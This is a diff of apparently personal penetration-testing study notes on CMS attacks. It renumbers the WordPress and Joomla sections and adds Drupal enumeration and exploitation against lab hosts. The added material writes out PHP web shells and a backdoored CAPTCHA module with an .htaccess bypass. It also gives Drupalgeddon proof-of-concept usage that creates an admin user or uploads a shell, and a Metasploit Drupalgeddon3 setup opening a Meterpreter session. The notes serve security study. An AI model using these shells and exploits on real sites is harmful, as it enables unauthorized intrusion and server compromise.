@@ -1,4 +1,4 @@
-## WordPress - Discovery & Enumeration
+## 1- WordPress - Discovery & Enumeration
 WordPress is a widely-used PHP CMS (runs on Apache + MySQL). Its huge number of plugins/themes creates a large attack surface, with most vulnerabilities coming from third-party components. During pentests, WordPress is easy to identify and enumerate through its directory structure, metadata, plugins, themes, and exposed files.
 #### Discovery / Footprinting
 - Check **/robots.txt**, **/wp-admin**, **/wp-content** to confirm WordPress.
@@ -124,7 +124,7 @@ With this information noted down, let's move on to the fun stuff: attacking Word
 
 ---
 
-## 1- Attacking WordPress  
+## 2- Attacking WordPress  
 WordPress can be attacked by abusing built-in features: brute-forcing login credentials, using the theme editor for RCE, leveraging Metasploit, and exploiting vulnerable plugins.
 #### Login Bruteforce  
 WPScan can brute-force WordPress users (via `xmlrpc` or `wp-login`).  
@@ -220,7 +220,7 @@ Cleanup of uploaded files is required.
 
 ---
 
-## 2- Joomla – Discovery & Enumeration  
+## 3- Joomla – Discovery & Enumeration  
 Joomla is a popular PHP-based CMS. During assessments we fingerprint Joomla, identify its version, discover plugins/components, and check for weak admin credentials.
 Query Joomla installation statistics:
 ```bash
@@ -322,7 +322,7 @@ Valid credentials discovered: **admin / admin**.
 ---
 
 
-## 3- Attacking Joomla
+## 4- Attacking Joomla
 
 #### Abusing Built-In Functionality
 
@@ -349,8 +349,6 @@ searchsploit Joomla 3.9.4
 - Joomla has **426+ CVEs**, many affecting extensions rather than core.
 - Joomla **3.9.4** (target version) is vulnerable to **CVE-2019-10945**: Authenticateddirectory traversal + authenticated file deletion.
 
-
-    
 - The exploits :
     - **CVE-2019-10945**  Authenticated Listing  arbitrary directories  () exploit for python3  can be found [here](https://github.com/dpgg101/CVE-2019-10945).)
     - Authenticated Deleting files (dangerous not typically used in real pentests)
@@ -360,3 +358,207 @@ arbitrary directories  exploit Example usage:
 python2.7 joomla_dir_trav.py --url "http://target/administrator/" --username admin --password admin --dir /
 ```
 Can reveal sensitive files (configs, scripts with credentials) if webserver user permissions allow it.
+
+
+---
+## 5- Drupal – Discovery & Enumeration
+#### Discovery / Footprinting
+
+- Drupal can be identified by:
+    - “Powered by Drupal” footer
+    - `Generator: Drupal` meta tag
+    - `CHANGELOG.txt` / `README.txt`
+    - References to `/node/` pages
+    - Default logo or page source
+- Example detection:
+```bash
+curl -s http://drupal.inlanefreight.local | grep Drupal
+# <meta name="Generator" content="Drupal 8"...>
+# <span>Powered by Drupal</span>
+```
+
+- Drupal content uses **nodes** → pages like `/node/<nodeid>`.
+```bash
+http://drupal.inlanefreight.local/node/1
+```
+![[Pasted image 20251202220439.png]]
+
+- Default user types:
+    1. `Administrator`: This user has complete control over the Drupal website.
+    2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
+    3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
+
+### Enumeration
+
+- Version may be detected via `CHANGELOG.txt`:
+```bash
+curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+# Drupal 7.57, 2018-02-21
+```
+
+- Newer versions often block this file:
+```bash
+curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+# 404 Not Found
+```
+
+- so Use **droopescan** for deeper enumeration:
+```bash
+droopescan scan drupal -u http://drupal.inlanefreight.local
+# Plugins found:
+#   php module
+# Possible versions: 8.9.0, 8.9.1
+# Interesting URL: /user/login
+```
+- Version 8.9.1 (found in scan) has no major core exploits → next steps:
+    - Enumerate installed modules
+    - Check misconfigurations
+    - Abuse built-in functionality
+
+
+---
+
+## 6- Attacking Drupal
+After fingerprinting Drupal, we focus on misconfigurations and vulnerabilities to gain internal access. Unlike other CMSs, Drupal does not easily allow uploading/editing PHP files through the admin panel.
+####  Leveraging the PHP Filter Module
+
+#####  In Drupal 7 and older
+admins could enable the **PHP Filter** module to execute embedded PHP code.
+- Steps:
+    Enable _PHP filter_ → Add Content → Basic Page.
+    ![[Pasted image 20251202224736.png]]
+    we could go to Content --> Add content and create a `Basic page`
+    ![[Pasted image 20251202224956.png]]
+ and  Insert a web shell using an uncommon parameter (MD5 string).
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+ ![[Pasted image 20251202225135.png]]
+ Execute commands:
+```bash
+curl -s http://drupal-qa.com/node/3?cmd=id
+# uid=33(www-data)
+```
+##### In Drupal 8+
+ PHP Filter is _not installed_ by default.To leverage this functionality, we would have to install the module ourselves
+ Download the module:
+```bash
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+```
+
+- Once downloaded go to `Administration` > `Reports` > `Available updates`.
+![[Pasted image 20251202225403.png]]
+>Note: Location may differ based on the Drupal version and may be under the Extend menu.
+
+- Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.
+#### Uploading a Backdoored Module
+Drupal allows module uploads by admins.  
+Steps:
+
+1. Download a module (e.g., CAPTCHA).
+```bash
+wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+```
+2. Create a PHP web shell:
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+3. Add `.htaccess` to give ourselves access to the folder. This is necessary as Drupal denies direct access to the` /modules` folder.
+```html
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+4. Pack and upload the modified module:
+```bash
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+```
+
+5.  Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
+![[Pasted image 20251202225636.png]]
+
+6. Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
+```bash
+curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id
+  # uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+#### Leveraging Known Vulnerabilities
+Drupal suffered several major RCE flaws known as **Drupalgeddon** vulnerabilities:
+
+- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
+- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
+- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
+####  Drupalgeddon (SQLI)
+
+- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005) A **pre-auth SQL Injection** in Drupal 7.0–7.31
+- Can create an admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script :
+```bash
+python2.7 drupalgeddon.py -t http://drupal-qa... -u hacker -p pwnd
+# [!] Administrator user created!
+```
+- Log in → enable PHP Filter → get RCE.
+
+- Also exploitable via Metasploit : [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit
+####  Drupalgeddon2 (RCE)
+
+- **Unauthenticated RCE** for versions < 7.58 and < 8.5.1
+- We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
+```bash
+python3 drupalgeddon2.py
+  # Check: http://drupal-dev.inlanefreight.local/hello.txt
+
+# check the upload file 
+curl -s http://drupal-dev.inlanefreight.local/hello.txt
+  # ;-) 
+```
+
+- Modify exploit poc to upload a PHP shell:
+```php
+<?php system($_GET[cmd]); ?>
+```
+
+- Encode + generate file:
+```bash
+echo '<?php system($_GET[cmd] );?>' | base64
+echo "BASE64" | base64 -d | tee mrb3n.php
+```
+- Re-run exploit → upload shell → execute:
+```bash
+python3 drupalgeddon2.py 
+  # Check: http://drupal-dev.inlanefreight.local/shell.php
+curl http://site.com/mrb3n.php?cmd=id
+  # uid=33(www-data)
+```
+####  Drupalgeddon3 (RCE)
+
+- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/) **Authenticated RCE** for many Drupal 7.x/8.x versions.
+- Requires authenticated User  that have the ability t **delete a node**.
+- Steps:
+    1. Log in → capture session cookie from Burp.
+![[Pasted image 20251202230534.png]]
+    2. Configure Metasploit exploit `multi/http/drupal_drupageddon3` :
+```bash
+use multi/http/drupal_drupageddon3
+set RHOSTS 10.129...
+set VHOST drupal-acc...
+set DRUPAL_SESSION SESS45ecf..<cookies here>
+set DRUPAL_NODE 1
+set LHOST 10.10.14.15
+exploit
+```
+- Execute exploit → Get Meterpreter:
+```bash
+meterpreter > getuid
+# www-data
+```
+
+
+---
+
